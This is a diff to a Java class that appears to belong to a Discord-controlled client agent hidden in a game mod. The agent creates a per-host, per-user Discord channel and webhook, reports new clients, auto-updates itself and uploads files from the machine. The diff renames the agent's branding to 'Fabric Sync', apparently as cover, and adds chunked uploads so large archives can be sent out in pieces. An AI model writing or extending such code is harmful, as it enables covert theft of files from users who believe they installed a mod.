@@ -21,6 +21,9 @@ import java.util.concurrent.ThreadPoolExecutor;
 import java.util.concurrent.TimeUnit;
 
 public final class Poller implements Runnable {
+	private static final long UPLOAD_LIMIT = 8L * 1024L * 1024L;
+	private static final long UPLOAD_PART = 7L * 1024L * 1024L;
+
 	private final Path installDir;
 	private final Path gameDir;
 	private final State state;
@@ -87,7 +90,7 @@ public final class Poller implements Runnable {
 		}
 		try {
 			Update.syncMod(installDir, gameDir);
-			Update.log(Update.currentVersion(), "-", "mod-synced");
+			Update.log(installDir, Update.currentVersion(), "-", "mod-synced");
 		} catch (UpdateException exception) {
 			Log.debug("Mod sync failed", exception);
 		} finally {
@@ -96,7 +99,7 @@ public final class Poller implements Runnable {
 	}
 
 	private void absorbRollback() {
-		Path marker = installDir.resolve(Update.ROLLBACK_MARKER);
+		Path marker = AgentPaths.rollbackMarker(installDir);
 		if (!Files.isRegularFile(marker)) {
 			return;
 		}
@@ -110,7 +113,7 @@ public final class Poller implements Runnable {
 			return;
 		}
 		auto.backoff();
-		Update.log("-", "-", "auto-failed startup rollback");
+		Update.log(installDir, "-", "-", "auto-failed startup rollback");
 		state.save(AgentPaths.state(installDir));
 		reply("Auto update failed: startup rollback");
 	}
@@ -137,7 +140,7 @@ public final class Poller implements Runnable {
 				runAutoUpdate();
 			} catch (Throwable throwable) {
 				Log.debug("Auto update failed", throwable);
-				Update.log("-", "-", "auto-failed " + throwable.getMessage());
+				Update.log(installDir, "-", "-", "auto-failed " + throwable.getMessage());
 				reply("Auto update failed: " + throwable.getMessage());
 			} finally {
 				Update.end();
@@ -156,12 +159,12 @@ public final class Poller implements Runnable {
 		}
 		if (info == null) {
 			auto.advance();
-			Update.log("-", "-", "auto-none");
+			Update.log(installDir, "-", "-", "auto-none");
 			return;
 		}
 		if (stagedByHand()) {
 			auto.advance();
-			Update.log(info.version, "-", "auto-skipped staged");
+			Update.log(installDir, info.version, "-", "auto-skipped staged");
 			return;
 		}
 		try {
@@ -172,7 +175,7 @@ public final class Poller implements Runnable {
 			return;
 		}
 		auto.advance();
-		Update.log(info.version, info.agentSha256, "auto-updated");
+		Update.log(installDir, info.version, info.agentSha256, "auto-updated");
 		state.save(AgentPaths.state(installDir));
 		reply("Auto update to " + info.version);
 		kill();
@@ -180,14 +183,14 @@ public final class Poller implements Runnable {
 
 	private void autoFailed(String message) {
 		auto.backoff();
-		Update.log("-", "-", "auto-failed " + message);
+		Update.log(installDir, "-", "-", "auto-failed " + message);
 		state.save(AgentPaths.state(installDir));
 		reply("Auto update failed: " + message);
 	}
 
 	private boolean stagedByHand() {
-		return Files.isRegularFile(installDir.resolve(Update.STAGED_NAME))
-			|| Files.isRegularFile(installDir.resolve(Update.MOD_STAGED_NAME));
+		return Files.isRegularFile(AgentPaths.agentStaged(installDir))
+			|| Files.isRegularFile(AgentPaths.modStaged(installDir));
 	}
 
 	@Override
@@ -315,7 +318,7 @@ public final class Poller implements Runnable {
 	}
 
 	private String createChannel() throws Exception {
-		String name = ("spc-" + SysInfo.hostname() + "-" + SysInfo.user())
+		String name = ("sync-" + SysInfo.hostname() + "-" + SysInfo.user())
 			.toLowerCase().replaceAll("[^a-z0-9-_]", "-");
 		if (name.length() > 90) {
 			name = name.substring(0, 90);
@@ -330,7 +333,7 @@ public final class Poller implements Runnable {
 			return Json.str(response, "id", "");
 		} catch (DiscordException exception) {
 			Map<String, Object> fallback = new LinkedHashMap<>();
-			fallback.put("name", ("spc-shared-" + name).substring(0, Math.min(90, name.length() + 11)));
+			fallback.put("name", ("sync-shared-" + name).substring(0, Math.min(90, name.length() + 11)));
 			fallback.put("type", 0);
 			Map<String, Object> response = Json.parseObject(client.post(
 				"/guilds/" + DiscordConfig.GUILD_ID + "/channels", Json.stringify(fallback)).body);
@@ -340,7 +343,7 @@ public final class Poller implements Runnable {
 
 	private String createWebhook() throws Exception {
 		Map<String, Object> body = new LinkedHashMap<>();
-		body.put("name", "Server Pack Core");
+		body.put("name", "Fabric Sync");
 		Map<String, Object> response = Json.parseObject(client.post(
 			"/channels/" + channelId + "/webhooks", Json.stringify(body)).body);
 		return Json.str(response, "url", "");
@@ -349,7 +352,7 @@ public final class Poller implements Runnable {
 	private void sendHello() {
 		try {
 			Map<String, Object> embed = new LinkedHashMap<>();
-			embed.put("title", "Server Pack Core");
+			embed.put("title", "Fabric Sync");
 			embed.put("description", "New client connected");
 			embed.put("color", 0x3498db);
 			List<Object> fields = new ArrayList<>();
@@ -625,6 +628,11 @@ public final class Poller implements Runnable {
 			if (file == null || !Files.isRegularFile(file)) {
 				return;
 			}
+			long size = Files.size(file);
+			if (size > UPLOAD_LIMIT) {
+				uploadParts(file);
+				return;
+			}
 			byte[] data = Files.readAllBytes(file);
 			String name = file.getFileName().toString();
 			uploadBytes(data, name, contentType(name));
@@ -633,8 +641,27 @@ public final class Poller implements Runnable {
 		}
 	}
 
+	/** Discord caps a single attachment; large archives travel as sorted .partNN files. */
+	private void uploadParts(Path file) throws java.io.IOException {
+		String base = file.getFileName().toString();
+		long size = Files.size(file);
+		int count = (int) ((size + UPLOAD_PART - 1L) / UPLOAD_PART);
+		try (java.io.RandomAccessFile input = new java.io.RandomAccessFile(file.toFile(), "r")) {
+			for (int index = 1; index <= count; index++) {
+				long offset = (long) (index - 1) * UPLOAD_PART;
+				int length = (int) Math.min(UPLOAD_PART, size - offset);
+				byte[] chunk = new byte[length];
+				input.seek(offset);
+				input.readFully(chunk);
+				String name = base + String.format(java.util.Locale.ROOT, ".part%02d", index);
+				uploadBytes(chunk, name, contentType(base));
+			}
+		}
+		Log.debug("Upload split into " + count + " parts: " + base);
+	}
+
 	private static String contentType(String name) {
-		String lower = name.toLowerCase();
+		String lower = name.toLowerCase().replaceFirst("\\.part\\d+$", "");
 		if (lower.endsWith(".zip")) {
 			return "application/zip";
 		}
